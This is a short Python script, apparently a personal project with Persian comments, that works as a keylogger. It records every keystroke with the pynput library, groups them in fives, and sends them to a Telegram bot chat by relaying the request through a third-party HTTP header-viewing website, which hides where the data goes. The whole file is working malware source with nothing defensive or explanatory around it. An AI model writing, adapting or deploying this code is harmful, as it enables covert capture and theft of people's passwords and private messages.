"""
Hamed Pourheydari
1403/01/03
"""

import requests
from pynput import keyboard



num=[]  #جاوگیری از هنگ نشدن برنامه و پردازش بهتر

def send(data):
    url = ("https://api.telegram.org/API_Telegram/SendMessage?chat_id=574674645&text= " + str(data)) 
    payload = {"UrlBox":url,
            "AgentList":"Mozilla Firefox",
            "VersionsList":"HTTP/1.1",
            "MethodList":"POST"
            }

    req = requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx",data=payload)
    print(req)


def keyboard_start():
    with keyboard.Listener(on_press=keyboard_log) as lstn:
        lstn.join()


def keyboard_log(key):
    if type(key) == keyboard._win32.KeyCode:
        k= key.char
   
    else:
        k= str(key)
    
    # send(k)
    num.append(k) #پیوسته کردن کلمات برای جلوگیری از پردازش بیستر 
    if len (num)  == 5:
        send(num)
        num.clear()

keyboard_start()

